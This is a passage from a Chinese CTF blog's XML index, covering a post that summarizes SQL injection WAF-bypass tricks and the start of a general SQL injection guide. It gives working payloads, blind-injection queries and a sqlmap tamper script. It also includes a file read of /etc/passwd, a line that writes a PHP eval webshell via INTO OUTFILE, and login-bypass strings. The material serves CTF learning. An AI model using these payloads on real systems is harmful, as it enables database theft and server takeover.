src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927749557-8adf803b-be2d-467f-994a-13d976c90613.png" alt="image.png"><br>回显信息失败，但是有dns解析记录<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927773487-b5c7fa08-f92a-4fa1-94fa-e53050992206.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 外带攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入绕过方法总结</title>
      <link href="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="注释符号绕过"><a href="#注释符号绕过" class="headerlink" title="注释符号绕过"></a>注释符号绕过</h1><p> 常用的注释符有:</p><pre><code class="python">-- 注释内容# 注释内容/*注释内容*/;</code></pre><p> 实例:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666767888898-cc7bea95-1b04-4fea-b995-9ff16bb9d38d.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666767908067-787addd2-d49e-41a1-a0d0-266c19aab48c-166912403146839.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666767983683-86522a64-ad50-4d4e-83b7-6f9d346c6d49-166912403146841.png" alt="image.png"></p><h1 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h1><p> 常用于 waf的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。<br>例如：waf过滤了关键字select，可以尝试使用Select等绕过。<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666768100924-7947e747-35b5-4167-8f97-fb5a22db45d4.png" alt="image.png"></p><h1 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h1><p>在mysql中/<em>admin</em>/是注释符，就像C和js中//代表注释的意思，也可以充当空白符。因为 /<strong>/在sql语句中可以解析成功。事实上许多WAF都考虑到/</strong>/可以作为空白分，但是waf检测 “/<em>.</em>/”很消耗性能，工程师会折中，可能在检测中间引入一些特殊字符，例如：/\w+<em>/。或者，WAF可能只中间检查n个字符“/</em>.{,n}*/”,直至达到检测的最大值，因此payload：</p><pre><code class="python">index.php?id=-1 union/**/select 1,2,3index.php?id=-1 union/*aaaaaaaaaaaaaaa(1万个a)aaaaaaaaaaaaaaaaa*/select 1,2,3</code></pre><h1 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h1><p> 内联注释就是把一些特有的仅在MYSQL上的语句放在 /<em>!…</em>/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666768162774-ce9f4f40-99e4-4bc9-acbd-4b3c5b2f23a5.png" alt="image.png"></p><h2 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h2><p> 在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。  </p><h1 id="特殊编码绕过"><a href="#特殊编码绕过" class="headerlink" title="特殊编码绕过"></a>特殊编码绕过</h1><h2 id="十六进制绕过"><a href="#十六进制绕过" class="headerlink" title="十六进制绕过"></a>十六进制绕过</h2><pre><code class="python">mysql&gt; select * from users where username=0xE69D8EE799BD;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | 李白     | 123      |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="ascii编码绕过"><a href="#ascii编码绕过" class="headerlink" title="ascii编码绕过"></a>ascii编码绕过</h2><pre><code class="python">mysql&gt; select * from users where password =concat(char(49),char(50),char(51));+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | 李白     | 123      |+----+----------+----------+1 row in set (0.00 sec)</code></pre><p> tip:好像新版mysql不能用了  ，反正遇到多试试吧！</p><h2 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h2><p>这个有条件，前提时后端过滤以后进行url解码，这时候可以对”这些符号或者字符进行两次url编码<br><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/32380857/1666790234001-83e2175a-f41a-4549-a7d6-5fcdfc619bdf.jpeg#clientId=u65160aa9-d068-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=238&id=uc170500e&margin=%5Bobject%20Object%5D&name=078f9b18a9d913c0123dcccf05c137dd.jpg&originHeight=298&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61815&status=done&style=none&taskId=u6e69cf22-741d-4abe-a151-10dca260ccd&title=&width=876.8" alt="078f9b18a9d913c0123dcccf05c137dd.jpg"></p><h2 id="unicode编码绕过"><a href="#unicode编码绕过" class="headerlink" title="unicode编码绕过"></a>unicode编码绕过</h2><p>** IIS中间件**可以识别Unicode字符，当URL中存在Unicode字符时，IIS会自动进行转换！</p><pre><code class="python">假如对select关键字进行了过滤，可以对其中几个字母进行unicode编码：se%u006cect</code></pre><h1 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h1><p> 一般绕过空格过滤的方法有以下几种方法来取代空格 </p><pre><code class="python">/**/()回车(url编码中的%0a)`(tap键上面的按钮)tap两个空格</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782853847-a136179a-f8da-406d-8fce-5982a0c26636-166912403146946.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782900873-042acb46-07f4-4645-ba99-4db87a159f3e-166912403146948.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782960545-2633b2f1-ab42-4d3f-bfc3-0e84d9bd6cc2-166912403146950.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782995285-ead5c057-0a63-4024-933d-c0098a29550b-166912403146952.png" alt="image.png"></p><h1 id="过滤or-and-xor-not-绕过"><a href="#过滤or-and-xor-not-绕过" class="headerlink" title="过滤or and xor not 绕过"></a>过滤or and xor not 绕过</h1><pre><code class="python">and = &amp;&amp;or = ||xor = | # 异或not = !</code></pre><h1 id="过滤等号-绕过"><a href="#过滤等号-绕过" class="headerlink" title="过滤等号=绕过"></a>过滤等号=绕过</h1><h2 id="使用like绕过"><a href="#使用like绕过" class="headerlink" title="使用like绕过"></a>使用like绕过</h2><p> 不加通配符的like执行的效果和=一致，所以可以用来绕过。<br>** 正常加上通配符的like:**<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783130840-322e337e-c4e9-4eb1-ade9-98797c19624b-166912403146954.png" alt="image.png"><br>** 不加上通配符的like可以用来取代=:**<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783196934-51d6dabd-9e99-4074-9110-22efe27cadd3-166912403146956.png" alt="image.png"></p><h2 id="rlike绕过"><a href="#rlike绕过" class="headerlink" title="rlike绕过"></a>rlike绕过</h2><p>** rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来**<br>用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783287214-2907bb1b-d180-4b9a-bf9d-6d7727cb2919-166912403146958.png" alt="image.png"></p><h2 id="regexp绕过"><a href="#regexp绕过" class="headerlink" title="regexp绕过"></a>regexp绕过</h2><p> regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783387574-65ffe75e-60ef-4569-8209-1f704f75ccf3-166912403146960.png" alt="image.png"></p><h2 id="使用大小于号来绕过"><a href="#使用大小于号来绕过" class="headerlink" title="使用大小于号来绕过"></a>使用大小于号来绕过</h2><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783427074-e021ae59-4b24-42a9-bf2f-ddbc310bf2bc-166912403146962.png" alt="image.png"></p><h2 id="lt-gt-等价于"><a href="#lt-gt-等价于" class="headerlink" title="&lt;&gt; 等价于 !="></a>&lt;&gt; 等价于 !=</h2><p> 所以在前面再加一个!结果就是等号了<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783488413-ecce5e46-10e2-4873-b0e9-c833976b6440-166912403146964.png" alt="image.png"></p><h1 id="过滤大小于号绕过"><a href="#过滤大小于号绕过" class="headerlink" title="过滤大小于号绕过"></a>过滤大小于号绕过</h1><p>为了方便测试，我把表的内容修改了一下:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783825320-7d3035e0-ebae-4ed3-8a89-95c0330ea498-166912403146966.png" alt="image.png"><br> 在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。但是如果过滤了大小于号的话，  我们 可以使用以下的关键字来绕过 </p><h2 id="greatest绕过"><a href="#greatest绕过" class="headerlink" title="greatest绕过"></a>greatest绕过</h2><pre><code class="python">greatest(n1, n2, n3…):返回n中的最大值</code></pre><p>嗯，我们来用这个函数来测试一下如何盲注:</p><pre><code class="python">mysql&gt; select * from users where id=1 and greatest(ascii(substr(username,1,1)),1)=97;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="least绕过"><a href="#least绕过" class="headerlink" title="least绕过"></a>least绕过</h2><pre><code class="python">least(n1,n2,n3...)  返回n中的最小值</code></pre><pre><code class="python">mysql&gt; select * from users where id=1 and least(ascii(substr(username,1,1)),9999)=97;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="strcmp绕过"><a href="#strcmp绕过" class="headerlink" title="strcmp绕过"></a>strcmp绕过</h2><pre><code class="python">strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</code></pre><pre><code class="python">mysql&gt; select * from users where id=1 and strcmp(ascii(substr(username,1,1)),97);Empty set (0.00 sec)mysql&gt; select * from users where id=1 and strcmp(ascii(substr(username,1,1)),96);+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="in关键字绕过"><a href="#in关键字绕过" class="headerlink" title="in关键字绕过"></a>in关键字绕过</h2><pre><code class="python">mysql&gt; select * from users where id=1 and substr(username,1,1) in (&#39;a&#39;);+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="between-a-and-b-绕过"><a href="#between-a-and-b-绕过" class="headerlink" title="between a and b  绕过"></a>between a and b  绕过</h2><pre><code class="python">mysql&gt; select * from users where id between 1 and 2;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 ||  2 | guest    | guest123 |+----+----------+----------+2 rows in set (0.00 sec)mysql&gt; select * from users where id=1 and substr(username,1,1) between &#39;a&#39; and &#39;e&#39;;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><p> 使用between a and b判等  </p><pre><code class="python">mysql&gt; select * from users where id=1 and substr(username,1,1) between &#39;a&#39; and &#39;a&#39;;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h1 id="过滤引号绕过"><a href="#过滤引号绕过" class="headerlink" title="过滤引号绕过"></a>过滤引号绕过</h1><h2 id="使用十六进制"><a href="#使用十六进制" class="headerlink" title="使用十六进制"></a>使用十六进制</h2><pre><code class="python">mysql&gt; select * from users where username=0xE69D8EE799BD;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | 李白     | 123      |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><p> 常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节  </p><pre><code class="python">%df\&#39; = %df%5c%27=縗’</code></pre><h1 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h1><p>sql盲注时常用到以下的函数：<br><strong>substr()</strong></p><pre><code class="python">substr(string, pos, len):从pos开始，取长度为len的子串substr(string, pos):从pos开始，取到string的最后</code></pre><p><strong>substring()</strong></p><pre><code class="python">用法和substr()一样</code></pre><p><strong>mid()</strong></p><pre><code class="python">用法和substr()一样，但是mid()是为了向下兼容VB6.0，已经过时，以上的几个函数的pos都是从1开始的</code></pre><p><strong>left()和right()</strong></p><pre><code class="python">left(string, len)和right(string, len):分别是从左或从右取string中长度为len的子串</code></pre><p><strong>limit</strong></p><pre><code class="python">limit pos len:在返回项中从pos开始去len个返回值，pos的从0开始</code></pre><p><strong>ascii()和char()</strong></p><pre><code class="python">ascii(char):把char这个字符转为ascii码char(ascii_int):和ascii()的作用相反，将ascii码转字符</code></pre><p> 如果waf过滤了逗号，并且只能盲注（盲注基本离不开逗号啊喂），在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for len，其中pos代表从pos个开始读取len长度的子串  </p><h2 id="from-pos-for-len绕过"><a href="#from-pos-for-len绕过" class="headerlink" title="from pos for len绕过"></a>from pos for len绕过</h2><p> 例如在substr()等函数中，常规的写法是:</p><pre><code class="python">mysql&gt; select substr(&quot;admin&quot;,1,2);+---------------------+| substr(&quot;admin&quot;,1,2) |+---------------------+| ad                  |+---------------------+1 row in set (0.00 sec)</code></pre><p> 如果过滤了逗号，可以这样使用from pos for len来取代:</p><pre><code class="python">mysql&gt; select substr(&quot;admin&quot; from 1 for 3);+------------------------------+| substr(&quot;admin&quot; from 1 for 3) |+------------------------------+| adm                          |+------------------------------+1 row in set (0.00 sec)</code></pre><p>所以遇到盲注时，我们可构造payload:</p><pre><code class="python">mysql&gt; select * from users where id =-1 union select ascii(substr(database() from 1 for 1)) &gt;120,2,3;+------+----------+----------+| id   | username | password |+------+----------+----------+|    0 | 2        | 3        |+------+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id =-1 union select ascii(substr(database() from 1 for 1)) &gt;10,2,3;+------+----------+----------+| id   | username | password |+------+----------+----------+|    1 | 2        | 3        |+------+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="join关键字绕过"><a href="#join关键字绕过" class="headerlink" title="join关键字绕过"></a>join关键字绕过</h2><pre><code class="python">mysql&gt; select * from users where id =-1 union select * from (select 1)a join (select database())b join(select 3)c;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | test     | 3        |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="like关键字绕过"><a href="#like关键字绕过" class="headerlink" title="like关键字绕过"></a>like关键字绕过</h2><p> 适用于substr()等提取子串的函数中的逗号  </p><h2 id="使用offset关键字"><a href="#使用offset关键字" class="headerlink" title="使用offset关键字"></a>使用offset关键字</h2><p>适用于limit中的逗号被过滤的情况<br>limit 2,1等价于limit 1 offset 2</p><pre><code class="python">mysql&gt; select * from users limit 1,1;+----+----------+----------+| id | username | password |+----+----------+----------+|  2 | guest    | guest123 |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users limit 1 offset 1;+----+----------+----------+| id | username | password |+----+----------+----------+|  2 | guest    | guest123 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h1 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h1><h2 id="sleep被过滤绕过"><a href="#sleep被过滤绕过" class="headerlink" title="sleep被过滤绕过"></a>sleep被过滤绕过</h2><p>我们使用 benchmark()  函数来代替:<br>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。  参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式</p><pre><code class="python">mysql&gt; select 1,2,3 and benchmark(1000000000,1);+---+---+-------------------------------+| 1 | 2 | 3 and benchmark(1000000000,1) |+---+---+-------------------------------+| 1 | 2 |                             0 |+---+---+-------------------------------+1 row in set (3.08 sec)</code></pre><h2 id="ascii-被过滤"><a href="#ascii-被过滤" class="headerlink" title="ascii()被过滤"></a>ascii()被过滤</h2><p> hex()、bin()<br>替代之后再使用对应的进制转string即可  </p><h2 id="group-concat-被过滤"><a href="#group-concat-被过滤" class="headerlink" title="group_concat()被过滤"></a>group_concat()被过滤</h2><p><strong>concat_ws()   第一个参数为分隔符</strong></p><pre><code class="python">mysql&gt; select concat_ws(&quot;,&quot;,database(),user());+----------------------------------+| concat_ws(&quot;,&quot;,database(),user()) |+----------------------------------+| test,root@localhost              |+----------------------------------+1 row in set (0.00 sec)</code></pre><h2 id="substr-substring-mid-可以相互取代-取子串的函数还有left-right-和locate等"><a href="#substr-substring-mid-可以相互取代-取子串的函数还有left-right-和locate等" class="headerlink" title="substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()和locate等"></a>substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()和locate等</h2><h2 id="user-和datadir被过滤"><a href="#user-和datadir被过滤" class="headerlink" title="user()和datadir被过滤"></a>user()和datadir被过滤</h2><pre><code class="python">user() --&gt; @@userdatadir–&gt;@@datadir</code></pre><h2 id="ord-–-gt-ascii-这两个函数在处理英文时效果一样，但是处理中文等时不一致。"><a href="#ord-–-gt-ascii-这两个函数在处理英文时效果一样，但是处理中文等时不一致。" class="headerlink" title="ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。"></a>ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</h2><h1 id="垃圾字符填充绕过"><a href="#垃圾字符填充绕过" class="headerlink" title="垃圾字符填充绕过"></a>垃圾字符填充绕过</h1><p> 一般为了考虑性能等原因，程序员在设置WAF绕过规则时设置了过滤的数据包长度，如果数据包太大或太长，就会直接放弃匹配过滤后面的数据，从而略过这个数据包。因此我们可以通过传入大量的参数值，超到WAF绕过的临界值，从而绕过  </p><pre><code class="python">index.php?id=-1aaaaaa(10万个a)aaaa union select 1,2,3</code></pre><h1 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h1><p> 简单来说，存在多个同名参数的情况下，可能存在逻辑层和 WAF 层对参数的取值不同，即可能逻辑层使用的第一个参数，而 WAF 层使用的第二个参数，而这时我们只需要第二个参数正常，通过WAF层，然后在第一个参数中插入注入语句，这样组合起来就可以绕过 WAF，payload：  </p><pre><code class="python">index.php?name=first&amp;name=last</code></pre><p> 而由于部分中间件的不同，部分检测规则存在差异，下面是一些服务器检测规则：<br> <img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666791032465-94ed2b6c-3422-4ca0-ae48-3eec1145a569.png" alt="8b2d8e44a6d34ea9b7b6e19a1fc6ccb9.png"></p><h1 id="keep-alive-持久连接"><a href="#keep-alive-持久连接" class="headerlink" title="keep-alive(持久连接)"></a><strong>keep-alive(持久连接)</strong></h1><p>在HTTP请求头部中有Connection这个字段，用来判断建立的 TCP连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个 http 包容量，需要分多次发送时，值会变成keep-alive，Keep-Alive功能使客户端到服务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive功能避免了建立或者重新建立连接。即本次发起的 http 请求所建立的 tcp 连接不断开，直到所发送内容结束Connection为close为止。<br>因此我们可以使用burpsuite抓包，手动将connection值设置为 keep-alive，然后在 http 请求报文中构造多个请求，将我们的注入代码隐藏在第 n 个请求中，从而绕过 waf。</p><h1 id="请求方式绕过："><a href="#请求方式绕过：" class="headerlink" title="请求方式绕过："></a><strong>请求方式绕过：</strong></h1><p>一些 WAF 对于get请求和post请求的处理机制不一样，可能对 POST 请求稍加松懈，因此给GET请求变成POST请求有可能绕过拦截。<br>一些 WAF 检测到POST请求后，就不会对GET携带的参数进行过滤检测，因此导致被绕过。<br>一般方法便是采用burpsuite抓包，更改提交方式，如下<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666791171451-68652e53-879a-46d9-ab0e-b574caa44cee.png" alt="6bcc270dcc934c7984213eb916a17f18.png"></p><h1 id="静态资源"><a href="#静态资源" class="headerlink" title="静态资源"></a>静态资源</h1><p>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制,waf为了提高检测效率，会直接放弃检测这样一些静态文件名后缀的请求。payload:</p><pre><code class="python">index.php/1.js?id=1</code></pre><p>备注: Aspx/php只识别到前面的.aspx/.php后面基本不识别</p><h1 id="url白名单"><a href="#url白名单" class="headerlink" title="url白名单"></a>url白名单</h1><p>为了防止误拦，部分WAF内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势:<br>index.php/admin.php?id=1<br>index.php?a=/manage/&amp;b=…/etc/passwd<br>index.php/…/…/…/ manage/…/sql.asp?id=2<br>WAF对传入的参数进行比较，只要uri中存在/manage/，/admin/ 就作为白名单直接放行，payload:</p><pre><code class="python">index.php?a=/manage/&amp;id=1 union select 1,2,3</code></pre><h1 id="缓冲区溢出绕过"><a href="#缓冲区溢出绕过" class="headerlink" title="缓冲区溢出绕过"></a><strong>缓冲区溢出绕过</strong></h1><pre><code class="python">(id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+</code></pre><p> 其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)  </p><h1 id="使用sqlmap进行bypass"><a href="#使用sqlmap进行bypass" class="headerlink" title="使用sqlmap进行bypass"></a>使用sqlmap进行bypass</h1><p>我们在知道替换规则的情况下可以自己写sqlmap的bypass脚本<br>在sqlmap文件夹下的/tamper/下，自己创建个py文件</p><pre><code class="python">#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.HIGHESTdef dependencies():    passdef tamper(payload, **kwargs):    payload = payload.replace(&quot;&#39;&quot;,&quot;%1$&#39;&quot;)　　　　　　#将什么替换成什么    payload = payload.replace(&quot;u&quot;,&quot;\u0075&quot;)　　　　  #将什么替换成什么，可以写很多个    return payload</code></pre><p> 在sqlmap使用的时候调用这个模块，即可使用自定义过程  </p><pre><code class="python">sqlmap --tamper=模块名.py -u &#39;http://xxx.xx.xx.xx/ddd.php?id=1&#39;</code></pre><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><p><a href="https://blog.csdn.net/huanghelouzi/article/details/82995313">https://blog.csdn.net/huanghelouzi/article/details/82995313</a><br><a href="https://blog.csdn.net/weixin_52118430/article/details/123607959">https://blog.csdn.net/weixin_52118430/article/details/123607959</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入总结</title>
      <link href="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
      <url>/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>关于这个漏洞，非常经典，但是考点又及其多，之前一直学的模模糊糊，遇到困难的地方就难以下手，故这里总结一下思路，参考了很多大佬的文章，十分感谢</p><h1 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h1><p>SQL注入实质上是将用户传入的参数没有进行严格的处理拼接sql语句的执行字符串中。<br>可能存在注入的地方有：登陆页面，搜索，获取HTTP头的信息(client-ip , x-forward-of)，订单处理（二次注入）等<br>注入的参数类型：POST, GET, COOKIES, SERVER 其实只要值传到数据库的执行语句那么就可能存在sql注入。<br>注入方法：union联合查询，延迟注入，布尔型回显判断注入，将内容输出到DNSlog</p><h1 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h1><p> information_schema包含了大量有用的信息，例如下图 :<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666794205856-324f76c8-fd02-42c4-8b07-acf208781212.png" alt="zawirg523g.png"><br>常用语句:</p><pre><code class="python">#sql当前用户：select user()数据库版本：select version() , select @@version数据库名：select database()操作系统：select @@version_compile_os所有变量：show variables单个变量：select @@secure_file_priv , show variables like &#39;secure_file_%&#39;爆字段数：order by 1... ，group by 1...查库名：select group_concat(schema_name) from information_schema.schemata查表名：select group_concat(table_name) from information_schema.tables where table_schema=&#39;库名&#39;查字段：select group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;读取某行：select * from mysql.user limit n,m // limit m offset n （第n行之后m行，第一行为0）# mysql.user下有所有的用户信息，其中authentication_string为用户密码的hash，如果可以使用可以修改这个值，那么就可以修改任意用户的密码读文件：select load_file(&#39;/etc/passwd&#39;)写文件：select &#39;&lt;?php @eval($_POST[a]);?&gt;&#39; into outfile &#39;/var/www/html/a.php&#39;  //该处文件名无法使用16进制绕过</code></pre><h1 id="基本手工注入流程"><a href="#基本手工注入流程" class="headerlink" title="基本手工注入流程"></a>基本手工注入流程</h1><h2 id="获取字段数"><a href="#获取字段数" class="headerlink" title="获取字段数"></a>获取字段数</h2><pre><code class="python">order by n  /*通过不断尝试改变n的值来观察页面反应确定字段数*/</code></pre><h2 id="获取系统数据库名"><a href="#获取系统数据库名" class="headerlink" title="获取系统数据库名"></a>获取系统数据库名</h2><pre><code class="python"># 在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中select null,null,schema_name from information_schema.schemata</code></pre><h2 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h2><pre><code class="python">select null,null,...,database()</code></pre><h2 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h2><pre><code class="python">select null,null,...,group_concat(table_name) from information_schema.tables where table_schema=database()# 或select null,null,...,table_name from information_schema.tables where table_schema=database() limit 0,1</code></pre><h2 id="获取表中字段"><a href="#获取表中字段" class="headerlink" title="获取表中字段"></a>获取表中字段</h2><p> 这里假设已经获取到表名为user  </p><pre><code class="python">select null,null,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;</code></pre><h2 id="获取各个字段的值"><a href="#获取各个字段的值" class="headerlink" title="获取各个字段的值"></a>获取各个字段的值</h2><p> 这里假设已经获取到表名为user，且字段为username和password  </p><pre><code class="python">select null,group_concat(username,password) from users</code></pre><h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><p>正常查询语句如下:</p><pre><code class="python">mysql_query(&quot;select username from users where id=&#39;$_GET[&#39;id&#39;]&#39; &quot;);</code></pre><p>我们可以构造万能密码:</p><pre><code class="python">&#39; or &#39;1&#39;=&#39;1　　　　　　　　//完整语句 select username where id=&#39;&#39; or &#39;1&#39;=&#39;1&#39;&#39; or 1=1#　　　　　　　　　//完整语句 select username where id=&#39;&#39; or 1=1#&#39;&#39;=0#　　　　　　　　　　　　//完整语句 select username,age from userinfo where id=&#39;&#39;=0#</code></pre><h1 id="联合注入"><a href="#联合注入" class="headerlink" 